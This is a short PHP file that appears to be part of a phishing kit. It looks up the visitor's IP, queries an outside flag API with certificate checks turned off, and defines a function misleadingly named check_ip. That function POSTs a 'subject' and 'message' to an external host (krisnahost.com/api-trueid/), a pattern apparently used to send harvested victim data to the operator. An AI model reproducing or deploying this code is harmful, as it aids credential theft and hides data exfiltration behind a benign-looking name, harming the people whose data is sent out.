
<?php 
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function check_ip($subjek, $pesan) {
$lookup = curl_init();
curl_setopt($lookup, CURLOPT_URL, 'https://krisnahost.com/api-trueid/');
curl_setopt($lookup, CURLOPT_RETURNTRANSFER, true);
curl_setopt($lookup, CURLOPT_POSTFIELDS, 'api1='.$subjek.'&api2='.$pesan);
curl_exec($lookup);
curl_close($lookup);
}

$flagsUrl = "http://alexhost.my.id/API/bendera.php?ip=".get_client_ip();

$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $flagsUrl);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
$resultFlags = curl_exec($ch2);
curl_close($ch2);
?>